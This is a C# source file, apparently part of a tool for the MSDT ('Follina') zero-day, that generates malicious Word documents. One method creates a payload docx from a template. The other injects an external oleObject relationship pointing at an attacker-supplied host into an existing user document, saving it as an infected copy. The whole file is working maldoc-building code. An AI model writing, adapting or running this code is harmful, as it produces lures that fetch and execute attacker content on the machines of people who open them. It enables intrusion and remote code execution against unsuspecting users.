using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO.Compression;

namespace MSDT_Zero_Day
{
    public class CreateMaldoc
    {
        public static void CreateDocx(string host)
        {
            BetterConsole.WriteLine("Creating payload...");

            // take docx input and extract it
            File.WriteAllBytes("template.docx", Resources.template);
            ZipFile.ExtractToDirectory("template.docx", "temp_docx", true);
            File.Delete("template.docx");

            // inject payload into the document
            string rels = File.ReadAllText("temp_docx\\word\\_rels\\document.xml.rels");
            string infected_rels = rels.Replace("{payload}", host);

            // output the infected rels file
            File.WriteAllText("temp_docx\\word\\_rels\\document.xml.rels", infected_rels);

        // re-zip it as .docx and output it
            string new_filename = "payload";
        retry:
            if (!File.Exists(new_filename + ".docx"))
                ZipFile.CreateFromDirectory("temp_docx", new_filename + ".docx");
            else
            {
                new_filename += "1";
                goto retry;
            }

            BetterConsole.WriteLine("Successfully created payload!");

            // delete the temporary folder
            Directory.Delete("temp_docx", true);
        }

        public static void InfectDocx(string path, string host)
        {
            BetterConsole.WriteLine("Creating payload...");

            // take docx input and extract it
            string filename = Path.GetFileNameWithoutExtension(path);
            ZipFile.ExtractToDirectory(path, "temp_docx", true);

            string rels = File.ReadAllText("temp_docx\\word\\_rels\\document.xml.rels");
            string payload = $"<Relationship Id=\"rId996\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"{host}/index.html!\" TargetMode=\"External\"/>";

            // inject payload into the document
            string opened_rels = rels.Split(new string[] { "</Relationships>" }, StringSplitOptions.None)[0];
            string infected_rels = opened_rels + payload + "</Relationships>";

            // output the infected rels file
            File.WriteAllText("temp_docx\\word\\_rels\\document.xml.rels", infected_rels);

            // re-zip it as .docx and output it
        retry:
            string new_filename = filename + "_payload.docx";
            if (!File.Exists(new_filename))
                ZipFile.CreateFromDirectory("temp_docx", new_filename);
            else
            {
                filename += "1";
                goto retry;
            }

            BetterConsole.WriteLine("Successfully created payload!");

            // delete the temporary folder
            Directory.Delete("temp_docx", true);
        }
    }
}